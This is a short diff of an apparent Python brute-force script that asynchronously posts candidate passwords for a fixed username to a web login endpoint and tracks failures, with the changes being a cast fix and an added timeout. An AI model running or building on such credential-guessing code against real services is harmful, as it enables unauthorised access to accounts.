@@ -44,14 +44,14 @@ async def fetch(session, password):
 		with async_timeout.timeout(100000000):
 			current_sche.value = current_sche.value + 1
 			if current_sche.value % 10000 == 0:
-				print("Schedule {}/{}".format((int)(current_sche.value / 10000), total10000))
+				print("Schedule {}/{}".format(int(current_sche.value / 10000), total10000))
 			async with session.post(url, data={
 				"username": USERNAME,
 				"password": password,
 				"theme": "sirius",
 				"lang": "en",
 				"func": "auth",
-			}, headers=headers) as response:
+			}, headers=headers,  timeout=100000) as response:
 				result = await response.text()
 				if 'Invalid password' in result:
 					print('Incorrect {}   {}/{}'.format(password, curr_process_req.value, total))
